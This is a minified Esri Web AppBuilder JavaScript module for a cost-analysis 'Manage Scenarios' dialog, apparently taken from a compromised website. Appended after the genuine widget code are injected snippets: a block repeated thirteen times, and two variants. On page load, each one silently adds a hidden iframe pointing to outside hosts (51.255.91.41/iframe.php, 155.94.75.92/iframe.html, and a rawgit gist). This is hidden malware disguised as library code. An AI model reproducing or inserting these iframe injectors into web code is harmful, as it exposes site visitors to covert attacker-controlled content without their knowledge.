// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/ManageScenarios.html":'\x3cdiv class\x3d"esriCTMainConfigurationContainer"\x3e\r\n    \x3cdiv\x3e\r\n        \x3cdiv class\x3d"esriCTPopupFields esriCTEllipsis"\x3e ${nls.costingInfo.scenarioNameLabel}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"scenarioNameNode" required\x3d"true" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"addBtnNode"\x3e${nls.costingInfo.addBtnLabel}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv\x3e\r\n         \x3cdiv class\x3d"esriCTAddScenarioNameTable" data-dojo-attach-point\x3d"addScenarioNameTableNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/dijit/Popup jimu/dijit/SimpleTable jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./ManageScenarios.html dojo/_base/array dojo/_base/lang dojo/on dojo/query dojo/dom-attr".split(" "),function(g,h,k,l,m,n,p,c,a,q,d,e){return g([l,m,n],{templateString:p,popup:null,_addScenarioTable:null,baseClass:"jimu-widget-cost-analysis-manage-scenarios",constructor:function(b){a.mixin(this,b)},postMixInProperties:function(){this.nls.common={};a.mixin(this.nls.common,
window.jimuNls.common)},postCreate:function(){this._addScenarioTable=this.popup=null;this.inherited(arguments);this._init()},_init:function(){this._createManageScenarioTable();this._createManageScenarioPopup();this.own(q(this.addBtnNode,"click",a.hitch(this,function(){this.scenarioNameNode.set("value",this.scenarioNameNode.get("value").trim());this.scenarioNameNode.validate()?(this._addNewScenario(this._addScenarioTable.getRows().length+1,this.scenarioNameNode.get("value")),this.scenarioNameNode.set("value",
" ")):this.scenarioNameNode.focus()})));this.scenarioNameNode.validator=a.hitch(this,this._scenarioNameValidator);this.scenarioNameNode.focus()},_createManageScenarioPopup:function(){this.popup=new h({titleLabel:this.nls.costingInfo.manageScenarioLabel,content:this.domNode,width:500,height:400,autoHeight:!0,"class":this.baseClass,buttons:[{label:this.nls.common.ok,onClick:a.hitch(this,"onOkButtonClicked")}]})},onOkButtonClicked:function(){this.emit("okButtonClicked",this._addScenarioTable.getData());
this.popup.close()},_createManageScenarioTable:function(){this._addScenarioTable=new k({fields:[{name:"id",title:this.nls.costingInfo.srNoLabel,type:"text",editable:!1,width:"100px"},{name:"field",title:this.nls.costingInfo.scenarioNameLabel,type:"text",editable:!1,width:"200px"},{name:"actions",title:this.nls.costingInfo.deleteLabel,width:"100px",type:"actions",actions:["delete"]}],selectable:!1});this._addScenarioTable.placeAt(this.addScenarioNameTableNode);this._addScenarioTable.startup();this._populateExistingScenarios();
this._addScenarioTable.onBeforeRowDelete=a.hitch(this,function(b){var f,a;this._addScenarioTable.deleteRow(b);b=this._addScenarioTable.getRows();c.forEach(b,function(b,c){f=b.cells[0];a=d("div",f)[0];e.set(a,"innerHTML",c+1);e.set(a,"title",c+1)})})},_populateExistingScenarios:function(){c.forEach(this.existingScenarios,a.hitch(this,function(b,a){this._addNewScenario(a+1,b)}))},_addNewScenario:function(b,a){this._createRow(b,a)},_createRow:function(b,a){this._addScenarioTable.addRow({id:b,field:a})},
_scenarioNameValidator:function(a){return""===a?!1:0<this._addScenarioTable.getRowDataArrayByFieldValue("field",a).length?(this.scenarioNameNode.invalidMessage=this.nls.costingInfo.duplicateScenarioName,!1):!0},getUpdatedManageScenarios:function(){this._addScenarioTable.getRows();d(".simple-table-row",this._addScenarioTable);return[]}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});